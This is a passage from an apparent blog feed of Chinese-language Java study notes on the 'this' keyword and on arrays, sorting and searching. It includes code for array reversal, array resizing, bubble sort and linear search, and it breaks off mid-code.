this关键字把所有变量和方法引用结合在一起。</p><p>遇到有同名的局部变量的场合，需要程序员加入 this关键字进行区分。不加入 this 关键字的场合，Java 遵循就近原则。</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">Example</span>&#123;<br>    <span class="hljs-built_in">int</span> n = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> act(<span class="hljs-built_in">int</span> n) &#123;&#125;<br>&#125;JAVA<br></code></pre></td></tr></table></figure><p>上面这个类的 <code>act()</code> 方法实际有 2 个参数。对其调用：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Example e <span class="hljs-operator">=</span> new Exmaple()<span class="hljs-comment">;</span><br>e.act(<span class="hljs-number">100</span>)<span class="hljs-comment">;JAVA</span><br></code></pre></td></tr></table></figure><p>可见，出现在方法名前的参数<code>e</code>，以及出现在方法名后的括号中的参数 <code>100</code></p><p>出现在方法名前的参数被称为 <strong>隐式参数</strong>（也称为方法调用的 目标 或 接收者）</p><p>出现在方法名后的参数被称为<strong>显式参数</strong>，就是所谓的实参</p><p>在每一个方法中，用 this 指代隐式参数。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">act</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.n = n;<br>&#125;JAVA<br></code></pre></td></tr></table></figure><p>此时，再以相同方式调用方法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">e</span>.act(<span class="hljs-number">100</span>);// &lt;———— 相当于 e.n = <span class="hljs-number">100</span>;<br><span class="hljs-attribute">JAVA</span><br></code></pre></td></tr></table></figure><h3 id="使用方法">6.8.1 使用方法</h3><ol type="1"><li><p><code>this</code>关键字可以用来访问本类的属性、方法、构造器</p></li><li><p><code>this</code> 用于区分当前类的 属性 和 局部变量</p></li><li><p>访问本类中成员方法的语法：<code>this.方法名</code></p></li><li><p>访问构造器的语法：<code>this(参数列表);</code></p><p>注意：只能在构造器中访问另一个构造器。而且，如果有这个语法，必须放置在第一条语句。</p></li><li><p><code>this</code> 不能在类定义的 外部 使用，只能在类定义的 方法中使用</p></li></ol><h2 id="附录">附录</h2>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>&lt;Java&gt; 5 数组、排序和查找</title>
    <link href="/2023/11/24/Java%205%20%E6%95%B0%E7%BB%84%E3%80%81%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE/"/>
    <url>/2023/11/24/Java%205%20%E6%95%B0%E7%BB%84%E3%80%81%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<blockquote><p>数组：可以存放多个同一类型的数据。数组也是一种数据，是引用类型。</p><p>即：数组就是一组数据。</p></blockquote><h2 id="一维数组">5.1 一维数组</h2><h3 id="数组基础">5.1.1 数组基础</h3><blockquote><p>数组可以是多个相同类型数据的组合，实现对这些数据的统一管理。</p><p>数组中的元素可以是任何数据类型。包括基本类型和引用类型，但是不能混用</p><p>数组的下标的从0开始的</p><p>数组创建后，如果没有赋值，有默认值：int（0），short（0），byte（0），long（0L），float（0.0F），double（0.0），char（000），boolean（false），String（null），Object（null）</p><p>使用数组的步骤：</p><ol type="1"><li>声明数组并开辟空间</li><li>给数组各个元素赋值</li><li>使用数组</li></ol><p>数组属于引用类型，数组型数据是对象（object）</p></blockquote><p><strong>数组的构造方法：</strong></p><ul><li><p>构造方式1：动态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<span class="hljs-comment">// 创建了数组 name，存放5个int</span><br><span class="hljs-type">int</span> a2[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<span class="hljs-comment">// 这种写法也行</span><br>a[<span class="hljs-number">2</span>] = <span class="hljs-number">15</span>;<span class="hljs-comment">// 访问数组第3个数</span><br></code></pre></td></tr></table></figure></li><li><p>构造方式2：动态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">double</span>[] scores;<span class="hljs-comment">// 先声明数组 name，此时数组是 null</span><br><span class="hljs-type">double</span> scores[];<br>scores = <span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[<span class="hljs-number">5</span>];<span class="hljs-comment">// 分配内存空间，可以存放数据了</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从键盘输入一组数据</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">double</span> scores[];<br>        scores = <span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[<span class="hljs-number">5</span>];<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; scores.length; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;请输入第&quot;</span> + (i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;个元素的值&quot;</span>);<br>            scores[i] = myScanner.nextDouble();<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;===数组的元素的清空如下：===&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; scores.length; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;第&quot;</span> + (i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;个元素的值= &quot;</span> + scores[i]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>构造方式3：静态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a[] = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>,<span class="hljs-number">77</span>&#125;<br></code></pre></td></tr></table></figure><p>确切知道数组每个元素的场合可以用这个方法。</p></li></ul><p><strong>数组的使用方法：</strong></p><ul><li><p>访问数组元素：数组名[元素下标]</p><p>其中，元素下标从 0 开始编号。如：访问 strs 数组的第一个元素<code>strs[0]</code></p></li><li><p>数组长度：<code>数组名.length</code></p><p>是一个 int 值。不能通过试图改变该值来改变数组容量</p></li></ul><h3 id="数组赋值机制">5.1.2 数组赋值机制</h3><ol type="1"><li><p>基本数据类型赋值，赋值方式是值拷贝。这个值就是具体的数据，且互不影响</p></li><li><p>数组在默认情况下是引用传递，赋的值是地址，赋值方式为引用传达。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[] array1 = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span>[] array2 = array1;<br>array2[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span>; <span class="hljs-comment">//array2的变化会影响到array1</span><br></code></pre></td></tr></table></figure><p>上述情况下，<code>array1[0]</code> 也会变成<code>100</code>。因为数组在 JVM 的 <strong>栈</strong>里是一个地址，指向 <strong>堆</strong>里的一个空间。这两个数组在上述情况下指向同一空间。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311251126139.png"alt="image-20231125112653956" /><figcaption aria-hidden="true">image-20231125112653956</figcaption></figure></li></ol><h3 id="数组拷贝">5.1.3 数组拷贝</h3><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[] array1 = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;;<br><span class="hljs-type">int</span>[] array2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[array1.length];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i &lt; array1.length;i++) &#123;<br>    array2[i] = array1[i];<br>&#125;<br><span class="hljs-comment">//但是按照上述方式拷贝后，两数组相互独立。</span><br></code></pre></td></tr></table></figure></p><h3 id="数组反转">5.1.4 数组反转</h3><p>方式 1：通过找规律反转，（临时变量）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayReverse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>, <span class="hljs-number">66</span>&#125;;<br><br>        <span class="hljs-comment">//规律</span><br>        <span class="hljs-comment">//1. 把 arr[0] 和 arr[5] 进行交换 &#123;66,22,33,44,55,11&#125;</span><br>        <span class="hljs-comment">//2. 把 arr[1] 和 arr[4] 进行交换 &#123;66,55,33,44,22,11&#125;</span><br>        <span class="hljs-comment">//3. 把 arr[2] 和 arr[3] 进行交换 &#123;66,55,44,33,22,11&#125;</span><br>        <span class="hljs-comment">//4. 一共要交换 3 次 = arr.length / 2</span><br>        <span class="hljs-comment">//5. 每次交换时，对应的下标 是 arr[i] 和 arr[arr.length - 1 -i]</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> arr.length; <span class="hljs-comment">//计算数组的长度</span><br>        <span class="hljs-keyword">for</span>( <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len / <span class="hljs-number">2</span>; i++) &#123;<br>            temp = arr[len - <span class="hljs-number">1</span> - i];<span class="hljs-comment">//保存</span><br>            arr[len - <span class="hljs-number">1</span> - i] = arr[i];<br>            arr[i] = temp;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;===翻转后数组===&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            System.out.print(arr[i] + <span class="hljs-string">&quot;\t&quot;</span>);<span class="hljs-comment">//66,55,44,33,22,11</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>方式 2：使用逆序赋值方式，（创建一个新数组）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>, <span class="hljs-number">66</span>&#125;;<br>        <span class="hljs-comment">//使用逆序赋值方式</span><br>        <span class="hljs-comment">//1. 先创建一个新的数组 arr2 ,大小 arr.length</span><br>        <span class="hljs-comment">//2. 逆序遍历 arr ,将 每个元素拷贝到 arr2 的元素中(顺序拷贝)</span><br>        <span class="hljs-comment">//3. 建议增加一个循环变量 j -&gt; 0 -&gt; 5</span><br>        <span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length];<br><span class="hljs-comment">//逆序遍历 arr</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> arr.length - <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &gt;= <span class="hljs-number">0</span>; i--, j++) &#123;<br>            arr2[j] = arr[i];<br>        &#125;<br>        <span class="hljs-comment">//4. 当 for 循环结束，arr2 就是一个逆序的数组 &#123;66, 55, 44,33, 22, 11&#125;</span><br>        <span class="hljs-comment">//5. 让 arr 指向 arr2 数据空间, 此时 arr 原来的数据空间就没有变量引用</span><br>        <span class="hljs-comment">// 会被当做垃圾，销毁</span><br>        arr = arr2;<br>        System.out.println(<span class="hljs-string">&quot;====arr 的元素情况=====&quot;</span>);<br><span class="hljs-comment">//6. 输出 arr 看看</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            System.out.print(arr[i] + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数组的扩容">5.1.5 数组的扩容</h3><p>当数组达到上限时，创建一个容量更大的新数组。将旧数组的元素依次放入，之后替换旧数组。</p><p>以下是一个扩容方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        要求：实现动态的给数组添加元素效果，实现对数组扩容。ArrayAdd.java</span><br><span class="hljs-comment">        1.原始数组使用静态分配 int[] arr = &#123;1,2,3&#125;</span><br><span class="hljs-comment">        2.增加的元素 4，直接放在数组的最后 arr = &#123;1,2,3,4&#125;</span><br><span class="hljs-comment">        3.用户可以通过如下方法来决定是否继续添加，添加成功，是否继续？y/n</span><br><span class="hljs-comment">        思路分析</span><br><span class="hljs-comment">        1. 定义初始数组 int[] arr = &#123;1,2,3&#125;//下标 0-2</span><br><span class="hljs-comment">        2. 定义一个新的数组 int[] arrNew = new int[arr.length+1];</span><br><span class="hljs-comment">        3. 遍历 arr 数组，依次将 arr 的元素拷贝到 arrNew 数组</span><br><span class="hljs-comment">        4. 将 4 赋给 arrNew[arrNew.length - 1] = 4;把 4 赋给 arrNew 最后一个元素</span><br><span class="hljs-comment">        5. 让 arr 指向 arrNew ; arr = arrNew; 那么 原来 arr 数组就被销毁</span><br><span class="hljs-comment">        6. 创建一个 Scanner 可以接受用户输入</span><br><span class="hljs-comment">        7. 因为用户什么时候退出，不确定，老师使用 do-while + break 来控制</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-comment">//初始化数组</span><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-type">int</span>[] arrNew = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length + <span class="hljs-number">1</span>];<br><br>            <span class="hljs-comment">//遍历 arr 数组，依次将 arr 的元素拷贝到 arrNew 数组</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>                arrNew[i] = arr[i];<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;请输入你要添加的元素：&quot;</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">addNum</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br>    <br>            arrNew[arrNew.length - <span class="hljs-number">1</span>] = addNum;<br>            <span class="hljs-comment">//让 arr 指向 arrNew,</span><br>            arr = arrNew;<br>            System.out.println(<span class="hljs-string">&quot;====arr 扩容后元素情况====&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>                System.out.print(arr[i] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            <span class="hljs-comment">//问用户是否继续</span><br>            System.out.println(<span class="hljs-string">&quot;是否继续添加 y/n&quot;</span>);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> myScanner.next().charAt(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span>( key == <span class="hljs-string">&#x27;n&#x27;</span>) &#123; <span class="hljs-comment">//如果输入 n ,就结束</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;你退出了添加...&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="排序算法">5.2 排序算法</h2><blockquote><p>排序也叫排序算法。是将一组数据，依指定的顺序进行排列的过程</p></blockquote><p>排序分为两类：</p><ul><li><p>内部排序：将所有要处理的数据加载到内部存储器中进行排序</p><p>内部排序主要有以下几种：</p><ul><li>插入排序：直接插入排序、希儿排序</li><li>选择排序：简单选择排序、堆排序</li><li>交换排序：冒泡排序、快速排序</li><li>归并排序</li><li>基数排序</li></ul></li><li><p>外部排序：数据量庞大，无法全部加载到内存中，需要借助外部存储进行排序</p><p>如：合并排序法、直接合并排序法</p></li></ul><h3 id="排序算法的时间复杂度">5.2.1 排序算法的时间复杂度</h3><table><thead><tr class="header"><th>排序法</th><th>平均时间</th><th>最差情形</th><th>稳定性</th><th>额外空间</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>冒泡排序</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>稳定</td><td>O(1)</td><td>n 小时较好</td></tr><tr class="even"><td>交换排序</td><td>O(n2)</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>不稳定</td><td>O(1)</td><td>n 小时较好</td></tr><tr class="odd"><td>选择排序</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>不稳定</td><td>O(1)</td><td>n 小时较好</td></tr><tr class="even"><td>插入排序</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>稳定</td><td>O(1)</td><td>大部分已排序时较好</td></tr><tr class="odd"><td>基数排序</td><td>O(n × k)</td><td>O(n × k)</td><td>稳定</td><td>O(n)</td><td>k 是 “桶” 的个数</td></tr><tr class="even"><td>Shell 排序</td><td>O(<span class="math inline">\(nlog_2n\)</span>)</td><td>O(<span class="math inline">\(nlog_2^2n\)</span>)</td><td>不稳定</td><td>O(1)</td><td>n 大时较好</td></tr><tr class="odd"><td>快速排序</td><td>O(<span class="math inline">\(nlog_2n\)</span>)</td><td>O(<span class="math inline">\(n^2\)</span>)</td><td>不稳定</td><td>O(n㏒n)</td><td>n 大时较好</td></tr><tr class="even"><td>归并排序</td><td>O(<span class="math inline">\(nlog_2n\)</span>)</td><td>O(<span class="math inline">\(nlog_2n\)</span>)</td><td>稳定</td><td>O(1)</td><td>n 小时较好</td></tr><tr class="odd"><td>堆排序</td><td>O(<span class="math inline">\(nlog_2n\)</span>)</td><td>O(<span class="math inline">\(nlog_2n\)</span>)</td><td>不稳定</td><td>O(1)</td><td>n 大时较好</td></tr></tbody></table><p><strong>稳定性：</strong>排序后，那些原本相等元素的相对顺序不改变</p><h3 id="冒泡排序">5.2.2 冒泡排序</h3><p><strong>冒泡排序：</strong>通过对待排序序列从左向右遍历，依次比较相邻元素的值。若发现<strong>前面的值比后面的值大则交换</strong>。</p><p>如此，各元素不断接近自己的位置。值较大的元素逐渐向后移动，就像水下的气泡一样逐渐上浮。</p><p>特别地：如果在某次排序中没有发生过任何交换，则此时是已完成排序，可提前结束排序过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">52</span>,<span class="hljs-number">16</span>,<span class="hljs-number">32</span>,<span class="hljs-number">88</span>,<span class="hljs-number">64</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>( <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<span class="hljs-comment">//外层循环是 4 次</span><br>            <span class="hljs-keyword">for</span>( <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length - <span class="hljs-number">1</span> - i; j++) &#123;<span class="hljs-comment">//4 次比较-3 次-2 次-1 次</span><br>                <span class="hljs-comment">//如果前面的数&gt;后面的数，就交换</span><br>                <span class="hljs-keyword">if</span>(arr[j] &gt; arr[j + <span class="hljs-number">1</span>]) &#123;<br>                    temp = arr[j];<br>                    arr[j] = arr[j+<span class="hljs-number">1</span>];<br>                    arr[j+<span class="hljs-number">1</span>] = temp;<br>                &#125;<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;\n==第&quot;</span>+(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;轮==&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length; j++) &#123;<br>                System.out.print(arr[j] + <span class="hljs-string">&quot;\t&quot;</span>);<br><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="选择排序">*5.2.3 选择排序……</h3><h2 id="查找算法">5.3 查找算法</h2><p>在 Java 中，常用的查找有 4 种：</p><ul><li>顺序查找（遍历）</li><li>二分查找</li><li>插值查找</li><li>斐波那契查找</li></ul><h3 id="线性查找">5.3.1 线性查找</h3><p>逐一比对，直到发现目标值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">seqSearch</span><span class="hljs-params">(<span class="hljs-type">int</span>[] array, <span class="hljs-type">int</span> target)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (array[i] == target) <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span 